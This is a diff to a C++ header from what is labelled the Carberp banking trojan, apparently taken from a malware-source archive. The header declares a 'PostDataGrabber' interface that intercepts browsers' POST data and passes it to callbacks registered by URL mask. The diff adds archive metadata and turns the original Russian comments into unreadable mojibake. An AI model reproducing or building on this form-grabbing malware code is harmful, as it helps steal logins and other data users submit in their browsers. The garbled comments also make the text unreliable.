@@ -1,4 +1,15 @@
-//Граббер поста данных отсылаемых браузерами
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 #ifndef PostDataGrabberH
 #define PostDataGrabberH
@@ -8,15 +19,15 @@ namespace PostDataGrabber
 	struct ParamEvent
 	{
 		const char* url; 
-		const char* data; //данные пост запроса
+		const char* data; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	};
 
-	typedef void (*TypeFuncReceiver)( ParamEvent& ); //тип функции которой будем передавать управление
+	typedef void (*TypeFuncReceiver)( ParamEvent& ); //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	struct Receiver
 	{
-		char* urlMask; //на какой урл реагировать
-		TypeFuncReceiver FuncReceiver; //функция получатель события
+		char* urlMask; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		TypeFuncReceiver FuncReceiver; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	};
 
 	bool Init();
@@ -25,7 +36,7 @@ namespace PostDataGrabber
 	Receiver* AddReceiver( const char* urlMask, TypeFuncReceiver FuncReceiver );
 	void DelReceiver( Receiver* receiver );
 
-	void DoEvents( const char* url, const char* postData ); //вызов события
+	void DoEvents( const char* url, const char* postData ); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 }
 
 #endif //PostDataGrabberH
